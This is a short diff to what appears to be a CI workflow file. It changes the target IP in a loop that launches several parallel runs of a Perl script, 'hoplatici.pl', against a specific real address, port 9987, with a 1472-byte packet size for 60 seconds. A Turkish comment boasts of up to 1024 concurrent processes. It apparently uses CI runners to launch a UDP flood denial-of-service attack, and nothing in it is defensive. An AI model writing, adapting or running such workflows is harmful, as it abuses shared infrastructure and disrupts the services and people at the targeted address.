@@ -25,7 +25,7 @@ jobs:
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 perl hoplatici.pl 185.244.28.100 9987 1472 60 &
+            sudo timeout 60 perl hoplatici.pl 37.230.60.150 9987 1472 60 &
             PIDS+=($!)
           done
           
